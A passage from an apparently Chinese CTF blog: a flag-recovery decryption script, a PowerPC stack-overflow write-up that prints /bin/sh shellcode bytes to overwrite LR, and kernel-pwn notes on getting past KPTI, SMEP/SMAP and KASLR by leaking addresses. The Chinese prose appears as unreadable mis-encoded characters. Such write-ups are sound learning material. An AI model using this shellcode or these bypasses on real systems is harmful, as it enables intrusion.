class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_bytes_hex</span>(<span class="params">data</span>):</span></span><br><span class="line">    lin = [<span class="string">&#x27;%0x&#x27;</span> % i <span class="keyword">for</span> i <span class="keyword">in</span> data]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join(lin))</span><br><span class="line"></span><br><span class="line">magic = <span class="string">&#x27;OVMF_And_Easy_Bios&#x27;</span></span><br><span class="line">demo = [<span class="number">0x46</span>, <span class="number">0x77</span>, <span class="number">0x74</span>, <span class="number">0xb0</span>, <span class="number">0x27</span>, <span class="number">0x8e</span>, <span class="number">0x8f</span>, <span class="number">0x5b</span>, <span class="number">0xe9</span>, <span class="number">0xd8</span>, <span class="number">0x46</span>, <span class="number">0x9c</span>, <span class="number">0x72</span>, <span class="number">0xe7</span>, <span class="number">0x2f</span>, <span class="number">0x5e</span>]</span><br><span class="line">v13 = [<span class="number">0</span>]*<span class="number">514</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    v13[i] = i</span><br><span class="line">    v13[i+<span class="number">256</span>] = <span class="built_in">ord</span>(magic[i%<span class="number">18</span>])</span><br><span class="line"></span><br><span class="line">v2 = <span class="number">0</span></span><br><span class="line">v3 = <span class="number">0</span></span><br><span class="line">new_list = []</span><br><span class="line"><span class="keyword">while</span> v2!=<span class="number">256</span>:</span><br><span class="line">    v4 = v13[v2]</span><br><span class="line">    v3 = (v13[v2 + <span class="number">256</span>] + v4 + v3) % <span class="number">256</span></span><br><span class="line">    v5 = v13[v3]</span><br><span class="line">    v13[v3] = v4</span><br><span class="line">    v13[v2] = v5</span><br><span class="line">    v2+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">v6 = <span class="number">0</span></span><br><span class="line">v7 = <span class="number">0</span></span><br><span class="line">v8 = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> v6 != <span class="number">16</span>:</span><br><span class="line">    v8 = v8 + <span class="number">1</span></span><br><span class="line">    v9 = v13[v8]</span><br><span class="line">    v10 = (v9 + v7) % <span class="number">256</span></span><br><span class="line">    v11 = v13[v10]</span><br><span class="line">    v13[v10] = v9</span><br><span class="line">    v7 = (v9 + v7) % <span class="number">256</span></span><br><span class="line">    v13[v8] = v11</span><br><span class="line">    result = v13[(v11 + v13[v10]) % <span class="number">256</span>]</span><br><span class="line">    new_list.append(result)</span><br><span class="line">    <span class="comment">#(v0 + v6) ^= result</span></span><br><span class="line">    v6 += <span class="number">1</span></span><br><span class="line"><span class="comment">#print len(demo)</span></span><br><span class="line"><span class="comment">#print len(new_list)</span></span><br><span class="line">flag_list = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    flag_list.append(new_list[i]^demo[i])</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(new_list[i]^demo[i]))</span><br><span class="line">print_bytes_hex(flag_list)</span><br><span class="line"><span class="comment">#flag&#123;88baec0b5154f859b5851097bb567f5c&#125;</span></span><br></pre></td></tr></table></div></figure>




        <h2 id="6-PPPPPPC"   >
          <a href="#6-PPPPPPC" class="heading-link"><i class="fas fa-link"></i></a><a href="#6-PPPPPPC" class="headerlink" title="6.PPPPPPC"></a>6.PPPPPPC</h2>
      
        <h3 id="1-è°ƒè¯•"   >
          <a href="#1-è°ƒè¯•" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-è°ƒè¯•" class="headerlink" title="(1)è°ƒè¯•"></a>(1)è°ƒè¯•</h3>
      <p>powerpcå¤§ç«¯æ¶æ„</p>
<p>è°ƒè¯•å‘ç°æ ˆæº¢å‡ºï¼Œè¯»å…¥0x320ï¼Œå¹¶ä¸”å˜é‡åç§»åœ¨0x140ï¼Œå¯è¦†ç›–$lrå¯„å­˜å™¨ï¼Œæ§åˆ¶ç¨‹åºæµï¼Œä¿æŠ¤éƒ½æ²¡å¼€ï¼Œå°±å°è¯•ret2shellcode</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201201949396.png" alt="image-20220120194956344"></p>

        <h3 id="2-æ³„éœ²åœ°å€"   >
          <a href="#2-æ³„éœ²åœ°å€" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-æ³„éœ²åœ°å€" class="headerlink" title="(2)æ³„éœ²åœ°å€"></a>(2)æ³„éœ²åœ°å€</h3>
      <p>ä½¿ç”¨é¢˜ç›®ç»™çš„<code>qemu-ppc-static</code>æ¥è¿è¡Œä¼šä½¿å¾—ç¨‹åºæ‰“å°æ‰€æœ‰å¯„å­˜å™¨çš„å€¼ï¼Œè¿œç¨‹ä¹Ÿæ˜¯è¿™æ ·çš„</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201201953531.png" alt="image-20220120195324259"></p>
<p>å‚ç…§å¦‚ä¸‹</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201201955804.png" alt="image-20220120195537738"></p>
<p>è¿œç¨‹è‚¯å®šä¹Ÿæ˜¯qemuï¼Œåœ°å€ä¸ä¼šæ”¹å˜ï¼Œé‚£ä¹ˆå°±å¯ä»¥è·å¾—æ ˆåœ°å€ï¼ŒåŒæ—¶ä¾æ®è°ƒè¯•æ•°æ®ä¹Ÿèƒ½å¾—åˆ°æˆ‘ä»¬è¾“å…¥æ•°æ®çš„ç›¸åº”çš„åç§»</p>

        <h3 id="3-å¯»æ‰¾shellcode"   >
          <a href="#3-å¯»æ‰¾shellcode" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-å¯»æ‰¾shellcode" class="headerlink" title="(3)å¯»æ‰¾shellcode"></a>(3)å¯»æ‰¾shellcode</h3>
      <p>ç›´æ¥å»<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://shell-storm.org/shellcode/" >shell-storm | Shellcodes Database</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>æ‰¾å¯¹åº”çš„shellcode</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&quot;\x7c\x3f\x0b\x78&quot;	/*mr	r31,r1*/</span><br><span class="line">&quot;\x7c\xa5\x2a\x79&quot;	/*xor.	r5,r5,r5*/</span><br><span class="line">&quot;\x42\x40\xff\xf9&quot;	/*bdzl+	10000454&lt; main&gt;*/</span><br><span class="line">&quot;\x7f\x08\x02\xa6&quot;	/*mflr	r24*/</span><br><span class="line">&quot;\x3b\x18\x01\x34&quot;	/*addi	r24,r24,308*/</span><br><span class="line">&quot;\x98\xb8\xfe\xfb&quot;	/*stb	r5,-261(r24)*/</span><br><span class="line">&quot;\x38\x78\xfe\xf4&quot;	/*addi	r3,r24,-268*/</span><br><span class="line">&quot;\x90\x61\xff\xf8&quot;	/*stw	r3,-8(r1)*/</span><br><span class="line">&quot;\x38\x81\xff\xf8&quot;	/*addi	r4,r1,-8*/</span><br><span class="line">&quot;\x90\xa1\xff\xfc&quot;	/*stw	r5,-4(r1)*/</span><br><span class="line">&quot;\x3b\xc0\x01\x60&quot;	/*li	r30,352*/</span><br><span class="line">&quot;\x7f\xc0\x2e\x70&quot;	/*srawi	r0,r30,5*/</span><br><span class="line">&quot;\x44\xde\xad\xf2&quot;	/*.long	0x44deadf2*/</span><br><span class="line">&quot;/bin/shZ&quot;; // the last byte becomes NULL</span><br></pre></td></tr></table></div></figure>

<p>å¯¹åº”åç§»æ‰¾åˆ°å³å¯</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201202003613.png" alt="image-20220120200332572"></p>
<p>è¦†ç›–LRå¯„å­˜å™¨ä¸ºè¯¥åœ°å€å®Œäº‹</p>

        <h2 id="7-easymsg"   >
          <a href="#7-easymsg" class="heading-link"><i class="fas fa-link"></i></a><a href="#7-easymsg" class="headerlink" title="7.easymsg"></a>7.easymsg</h2>
      <p>æ²¡çœ‹æ‡‚</p>

        <h1 id="äºŒã€çŸ¥è¯†ç‚¹"   >
          <a href="#äºŒã€çŸ¥è¯†ç‚¹" class="heading-link"><i class="fas fa-link"></i></a><a href="#äºŒã€çŸ¥è¯†ç‚¹" class="headerlink" title="äºŒã€çŸ¥è¯†ç‚¹"></a>äºŒã€çŸ¥è¯†ç‚¹</h1>
      
        <h2 id="1-å›ºä»¶è§£åŒ…-1"   >
          <a href="#1-å›ºä»¶è§£åŒ…-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-å›ºä»¶è§£åŒ…-1" class="headerlink" title="1.å›ºä»¶è§£åŒ…"></a>1.å›ºä»¶è§£åŒ…</h2>
      
        <h3 id="1-binwalk"   >
          <a href="#1-binwalk" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-binwalk" class="headerlink" title="(1)binwalk"></a>(1)binwalk</h3>
      <p>å¸¸ç”¨çš„å‘½ä»¤</p>
<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">binwalk -Me xxx.bin  <span class="comment">#è§£åŒ…</span></span><br><span class="line">binwalk -A xxx.bin <span class="comment">#æŸ¥çœ‹æ¶æ„</span></span><br></pre></td></tr></table></div></figure>

<p>æœ‰æ—¶å€™å¯ä»¥ç”¨mountæŒ‚è½½binwalkæ‰“ä¸å¼€çš„å›ºä»¶</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mount ./rootfs.img test</span><br></pre></td></tr></table></div></figure>


        <h2 id="2-å›ºä»¶åŠ è§£å¯†"   >
          <a href="#2-å›ºä»¶åŠ è§£å¯†" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-å›ºä»¶åŠ è§£å¯†" class="headerlink" title="2.å›ºä»¶åŠ è§£å¯†"></a>2.å›ºä»¶åŠ è§£å¯†</h2>
      
        <h3 id="1-åˆ¤æ–­åŠ å¯†"   >
          <a href="#1-åˆ¤æ–­åŠ å¯†" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-åˆ¤æ–­åŠ å¯†" class="headerlink" title="(1)åˆ¤æ–­åŠ å¯†"></a>(1)åˆ¤æ–­åŠ å¯†</h3>
      <p>æœ‰æ—¶å€™å›ºä»¶å¯èƒ½ä¼šè¢«åŠ å¯†ï¼Œå¯ç”¨binwalkçš„ç†µè®¡ç®—æ¥åˆ¤æ–­ï¼Œå‹ç¼©æˆ–è€…åŠ å¯†çš„æ•°æ®å…·æœ‰è¾ƒé«˜çš„ç†µå€¼</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binwalk -E xxx.bin</span><br></pre></td></tr></table></div></figure>

<p>æœªåŠ å¯†çš„</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201211850770.png" alt="image-20220121185003706"></p>
<p>åŠ å¯†çš„</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201211850841.png" alt="image-20220121185022780"></p>

        <h3 id="2-è§£å¯†å¸¸è§æ–¹æ³•"   >
          <a href="#2-è§£å¯†å¸¸è§æ–¹æ³•" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-è§£å¯†å¸¸è§æ–¹æ³•" class="headerlink" title="(2)è§£å¯†å¸¸è§æ–¹æ³•"></a>(2)è§£å¯†å¸¸è§æ–¹æ³•</h3>
      <p>é€†å‘ï¼Œè‡ªå·±å¯»æ‰¾ç­‰ç­‰</p>

        <h2 id="3-å›ºä»¶å¯»æ‰¾"   >
          <a href="#3-å›ºä»¶å¯»æ‰¾" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-å›ºä»¶å¯»æ‰¾" class="headerlink" title="3.å›ºä»¶å¯»æ‰¾"></a>3.å›ºä»¶å¯»æ‰¾</h2>
      <p>ç½‘ä¸Šï¼Œå®˜ç½‘å•¥çš„ï¼Œæˆ–è€…ç¡¬ä»¶æå–ï¼Œåæ­£åˆ°æ—¶å€™å†çœ‹ä¸€éæŠŠï¼ŒæœåŠ¡å™¨ï¼Œå¾çˆ±ç ´è§£â€¦</p>
<p>è§‚å¯Ÿä»¥ä¸‹</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201211856001.png" alt="image-20220121185648863"></p>
</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2022/01/14/kernel%E7%AC%94%E8%AE%B0%E6%B1%87%E6%80%BB/">kernelç¬”è®°æ±‡æ€»</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2022-01-14</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2022-05-22</span></span></div></header><div class="post-body"><div class="post-excerpt">
        <h1 id="ä¸€ã€å¸¸è§ä¿æŠ¤"   >
          <a href="#ä¸€ã€å¸¸è§ä¿æŠ¤" class="heading-link"><i class="fas fa-link"></i></a><a href="#ä¸€ã€å¸¸è§ä¿æŠ¤" class="headerlink" title="ä¸€ã€å¸¸è§ä¿æŠ¤"></a>ä¸€ã€å¸¸è§ä¿æŠ¤</h1>
      
        <h2 id="1-KPTI"   >
          <a href="#1-KPTI" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-KPTI" class="headerlink" title="1.KPTI"></a>1.KPTI</h2>
      <p>åœ¨v4.15ä¹‹åä¼šé»˜è®¤å¼€å¯</p>
<p>å†…æ ¸é¡µè¡¨éš”ç¦»ï¼Œå¼€å¯ä¹‹åå¯ä»¥è®¿é—®ç”¨æˆ·ç©ºé—´å†…å­˜ï¼Œä½†æ˜¯ä¸èƒ½æ‰§è¡Œç”¨æˆ·ç©ºé—´ä»£ç </p>
<p>å³æ— æ³•ç›´æ¥é€šè¿‡æ„é€ swapgs_iretqçš„ROPæ¥è¿”å›ç”¨æˆ·æ€ï¼Œå¯å‚è€ƒç»•è¿‡</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/240006#h3-2" >Linux Kernel KPTIä¿æŠ¤ç»•è¿‡ - å®‰å…¨å®¢ï¼Œå®‰å…¨èµ„è®¯å¹³å° (anquanke.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /sys/devices/system/cpu/vulnerabilities/*</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201162023861.png" alt="image.png"></p>
<p>è¿™ä¸ªä¹Ÿæœ‰ç±»ä¼¼çš„å¯åŠ¨è„šæœ¬</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-append &quot;console=ttyS0 quiet root=/dev/sda rw init=/init oops=panic panic=1 panic_on_warn=1 kaslr pti=on&quot; \</span><br></pre></td></tr></table></div></figure>


        <h2 id="2-SMEPã€SMAPã€KASLRç­‰"   >
          <a href="#2-SMEPã€SMAPã€KASLRç­‰" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-SMEPã€SMAPã€KASLRç­‰" class="headerlink" title="2.SMEPã€SMAPã€KASLRç­‰"></a>2.SMEPã€SMAPã€KASLRç­‰</h2>
      <p>è¿™ä¸ªç›´æ¥çœ‹å¯åŠ¨è„šæœ¬</p>

        <h3 id="1-SMEPå’ŒSMAP"   >
          <a href="#1-SMEPå’ŒSMAP" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-SMEPå’ŒSMAP" class="headerlink" title="(1)SMEPå’ŒSMAP"></a>(1)SMEPå’ŒSMAP</h3>
      <p>å¯ä»¥é€šè¿‡ROPä¿®æ”¹CR3å¯„å­˜å™¨æ¥ç»•è¿‡</p>

        <h3 id="2-KASLR"   >
          <a href="#2-KASLR" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-KASLR" class="headerlink" title="(2)KASLR"></a>(2)KASLR</h3>
      <p>é€šå¸¸éœ€è¦æ³„éœ²åœ°å€ï¼Œå¯ä»¥é€šè¿‡ä»¥ä¸‹å‘½ä»¤æŸ¥çœ‹å½“å‰åŸºåœ°å€</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/kallsyms | grep startup_64</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201181206238.png" alt="image-20220118120655137"></p>
<p>ä½†æ˜¯ä¹Ÿå¯ä»¥çˆ†ç ´ï¼ŒKASLRçš„éšæœºåŒ–ç¨‹åº¦åªæœ‰9bitï¼Œè¿˜æ˜¯æ¯”è¾ƒå¥½çˆ†ç ´çš„ï¼Œå‚è€ƒä¹‹åçš„çˆ†ç ´KASLRçš„æ¨¡æ¿</p>

        <h2 id="3-å…¶ä»–ä¿æŠ¤"   >
          <a href="#3-å…¶ä»–ä¿æŠ¤" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-å…¶ä»–ä¿æŠ¤" class="headerlink" title="3.å…¶ä»–ä¿æŠ¤"></a>3.å…¶ä»–ä¿æŠ¤</h2>
      
        <h3 id="1-STACK-PROTECTOR"   >
          <a href="#1-STACK-PROTECTOR" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-STACK-PROTECTOR" class="headerlink" title="(1)STACK PROTECTOR"></a>(1)STACK PROTECTOR</h3>
      <p>ç±»ä¼¼ç”¨æˆ·æ€çš„cancary</p>

        <h3 id="2-å‚è€ƒREADME-MD"   >
          <a href="#2-å‚è€ƒREADME-MD" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-å‚è€ƒREADME-MD" class="headerlink" title="(2)å‚è€ƒREADME.MD"></a>(2)å‚è€ƒREADME.MD</h3>
      <p>æœ‰æ—¶å€™å‡ºé¢˜äººç»™çš„README.MDä¼šç»™é…ç½®</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">CONFIG_SLAB=y</span><br><span class="line">CONFIG_SLAB_FREELIST_RANDOM=y</span><br><span class="line">CONFIG_SLAB_FREELIST_HARDENED=y</span><br><span class="line">CONFIG_HARDENED_USERCOPY=y</span><br><span class="line">CONFIG_STATIC_USERMODEHELPER=y</span><br><span class="line">CONFIG_STATIC_USERMODEHELPER_PATH=&quot;&quot;</span><br></pre></td></tr></table></div></figure>

<p>å¦‚ä¸Šå°±æ˜¯ä½¿ç”¨SLABåˆ†é…ï¼Œå¼€å¯RANDOMå’ŒHARDENEDä¿æŠ¤ï¼Œä»¥åŠHardened Usercopyï¼ˆå†…æ ¸ç©ºé—´æŒ‡é’ˆä¹Ÿä¼šè¿›è¡Œéå¸¸ä¸¥æ ¼çš„å®‰å…¨æ€§æ£€æŸ¥ï¼ŒåŒ…æ‹¬ä¸å…è®¸ä¸ºç©ºæŒ‡é’ˆã€ä¸å…è®¸æŒ‡å‘ <code>kmalloc</code> åˆ†é…çš„é›¶é•¿åº¦åŒºåŸŸã€ä¸å…è®¸æŒ‡å‘å†…æ ¸ä»£ç æ®µã€å¦‚æœæŒ‡å‘ Slab åˆ™ä¸å…è®¸è¶…è¿‡ Slab åˆ†é…å™¨åˆ†é…çš„é•¿åº¦ã€å¦‚æœæ¶‰åŠåˆ°æ ˆåˆ™ä¸å…è®¸è¶…å‡ºå½“å‰è¿›ç¨‹çš„æ ˆç©ºé—´ç­‰ç­‰ã€‚ï¼‰å’Œ <code>Static Usermodehelper Path</code>ï¼ˆmodprobe_path ä¸ºåªè¯»ï¼Œä¸å¯ä¿®æ”¹ï¼‰</p>
<p>å‚è€ƒï¼š<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://arttnba3.cn/2021/10/31/CTF-0X05-TCTF2021_FINAL/" >ã€CTF.0x05ã€‘TCTF2021-FINAL ä¸¤é“ kernel pwn é¢˜è§£ - arttnba3â€™s blog</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h1 id="äºŒã€æ³„éœ²åœ°å€"   >
          <a href="#äºŒã€æ³„éœ²åœ°å€" class="heading-link"><i class="fas fa-link"></i></a><a href="#äºŒã€æ³„éœ²åœ°å€" class="headerlink" title="äºŒã€æ³„éœ²åœ°å€"></a>äºŒã€æ³„éœ²åœ°å€</h1>
      <p>ä¸€èˆ¬æ˜¯å¼€å¯KASLRçš„æ—¶å€™å¯»æ‰¾åœ°å€</p>
<p>å‚ç…§ï¼š<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/kernel-mode/defense/access-control/information-disclosure/" >ä¿¡æ¯æ³„æ¼ - CTF Wiki (ctf-wiki.org)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h2 id="1-å¸¸ç”¨æ–¹æ³•"   >
          <a href="#1-å¸¸ç”¨æ–¹æ³•" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-å¸¸ç”¨æ–¹æ³•" class="headerlink" title="1.å¸¸ç”¨æ–¹æ³•"></a>1.å¸¸ç”¨æ–¹æ³•</h2>
      
        <h3 id="Dmesg"   >
          <a href="#Dmesg" class="heading-link"><i class="fas fa-link"></i></a><a href="#Dmesg" class="headerlink" title="Dmesg"></a>Dmesg</h3>
      <p>æ˜¾ç¤ºå¯åŠ¨æ—¶çš„ä¸€äº›ä¿¡æ¯ï¼Œå…¶ä¸­è‚¯å®šåŒ…å«å¾ˆå¤šå‡½æ•°åœ°å€</p>
<p>å½“è®¾ç½®å¦‚ä¸‹å³ä¸èƒ½å†ç”¨</p>
<ul>
<li>å¯åŠ¨æ—¶<code>echo 1 &gt; /proc/sys/kernel/dmesg_restrict</code>ï¼Œå³è®¾ç½®<code>dmesg_restrict</code>ä¸º1</li>
<li>ç¼–è¯‘å†…æ ¸æ—¶<code>CONFIG_SECURITY_DMESG_RESTRICT=y</code>ï¼Œè¿™ä¸ªæ•ˆæœç­‰åŒ</li>
</ul>

        <h3 id="kallsyms"   >
          <a href="#kallsyms" class="heading-link"><i class="fas fa-link"></i></a><a href="#kallsyms" class="headerlink" title="kallsyms"></a>kallsyms</h3>
      <p>ä¿å­˜æ‰€æœ‰å‡½æ•°åœ°å€(å…¨å±€çš„ã€é™æ€çš„)å’Œéæ ˆæ•°æ®å˜é‡åœ°å€</p>
<p>å½“å…¶ä¸­çš„å€¼å¦‚ä¸‹æ—¶å¯¹åº”æ‰€ç¤ºæƒ…å†µï¼Œä¸€èˆ¬é¢˜ç›®å¯åŠ¨æ—¶ç›´æ¥</p>
<p><code>echo 2 &gt; /proc/sys/kernel/kptr_restrict</code></p>
<ul>
<li>0ï¼šé»˜è®¤æƒ…å†µä¸‹ï¼Œæ²¡æœ‰ä»»ä½•é™åˆ¶ã€‚</li>
<li>1ï¼šä½¿ç”¨ <code>ï¼…pK</code> è¾“å‡ºçš„å†…æ ¸æŒ‡é’ˆåœ°å€å°†è¢«æ›¿æ¢ä¸º 0ï¼Œé™¤éç”¨æˆ·å…·æœ‰<code>CAP_ SYSLOG</code>ç‰¹æƒï¼Œå¹¶ä¸” <code>group id</code>å’ŒçœŸæ­£çš„ id ç›¸ç­‰ã€‚(è¿™ä¸ªä¸å¤ªæ‡‚ï¼Œrootç”¨æˆ·å°±å¯ä»¥çœ‹åˆ°)</li>
<li>2ï¼šä½¿ç”¨ <code>ï¼…pK</code> è¾“å‡ºçš„å†…æ ¸æŒ‡é’ˆéƒ½å°†è¢«æ›¿æ¢ä¸º 0 ï¼Œå³ä¸æƒé™æ— å…³ã€‚(rootç”¨æˆ·ä¹Ÿçœ‹ä¸åˆ°ï¼Œéœ€è¦åœ¨å¯åŠ¨æ—¶å»æ‰è¿™ä¸ªæ‰è¡Œ)</li>
</ul>

        <h3 id="module"   >
          <a href="#module" class="heading-link"><i class="fas fa-link"></i></a><a href="#module" class="headerlink" title="module"></a>module</h3>
      <p>è¿™ä¸ªæ˜¯ç”¨æ¥è·å–æ¨¡å—åŠ è½½åœ°å€çš„</p>
<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /sys/module/module_name/sections/.text</span><br></pre></td></tr></table></div></figure>

<p>ä½†æ˜¯å½“ç¼–ç¨‹æ—¶æ•…æ„å°†æ¨¡å—éšè—èµ·æ¥çš„è¯ï¼Œå°±ä¸ä¼šè¢«æŸ¥çœ‹åˆ°äº†ï¼Œä¸‹é¢æœ‰è®²åˆ°ã€‚</p>

        <h1 id="ä¸‰ã€ä¸‹è½½genericç‰ˆæœ¬å†…æ ¸"   >
          <a href="#ä¸‰ã€ä¸‹è½½genericç‰ˆæœ¬å†…æ ¸" class="heading-link"><i class="fas fa-link"></i></a><a href="#ä¸‰ã€ä¸‹è½½genericç‰ˆæœ¬å†…æ ¸" class="headerlink" title="ä¸‰ã€ä¸‹è½½genericç‰ˆæœ¬å†…æ ¸"></a>ä¸‰ã€ä¸‹è½½genericç‰ˆæœ¬å†…æ ¸</h1>
      <figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt search linux|grep linux-image</span><br></pre></td></tr></table></div></figure>

<p>è‚¯å®šä¸å¤ªå…¨ï¼Œå½“ç„¶ä¸åŒçš„aptæºå¯¹åº”ä¸åŒçš„ï¼Œæ‰€ä»¥è¿˜æ˜¯å­¦ä¼šè‡ªå·±ç¼–è¯‘å†…æ ¸æœ€å¥½ã€‚</p>
<p>è¿™ç§æ–¹æ³•ä¸‹è½½ä¸‹æ¥æ²¡æœ‰ç¬¦å·è¡¨ï¼Œå¯ä»¥é€šè¿‡<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/marin-m/vmlinux-to-elf" >vmlinux-to-elf</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>æ¥è·å–ç¬¦å·è¡¨</p>

        <h1 id="å››ã€æ‰“å°åœ°å€"   >
          <a href="#å››ã€æ‰“å°åœ°å€" class="heading-link"><i class="fas fa-link"></i></a><a href="#å››ã€æ‰“å°åœ°å€" class="headerlink" title="å››ã€æ‰“å°åœ°å€"></a>å››ã€æ‰“å°åœ°å€</h1>
      
        <h2 id="1-å¸¸è§„æ‰“å°"   >
          <a href="#1-å¸¸è§„æ‰“å°" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-å¸¸è§„æ‰“å°" class="headerlink" title="1.å¸¸è§„æ‰“å°"></a>1.å¸¸è§„æ‰“å°</h2>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">printf(&quot;0x%lx\n&quot;,leakAddr);</span><br></pre></td></tr></table></div></figure>

<p>æœ‰æ—¶å€™ä¸åŠ <code>\n</code>æ‰“ä¸å‡ºæ¥</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#define HEX(x) printf(&quot;[*]0x%016lx\n&quot;, (size_t)x)</span><br><span class="line">#define LOG(addr) printf(&quot;[*]%s\n&quot;, addr)</span><br></pre></td></tr></table></div></figure>


        <h2 id="2-gdbå¼æ‰“å°"   >
          <a href="#2-gdbå¼æ‰“å°" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-gdbå¼æ‰“å°" class="headerlink" title="2.gdbå¼æ‰“å°"></a>2.gdbå¼æ‰“å°</h2>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">gdbPrint</span><span class="params">(<span class="keyword">size_t</span>* data,<span class="keyword">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> rowLen = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span> ; i &lt; len/<span class="number">0x10</span> ; i ++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span 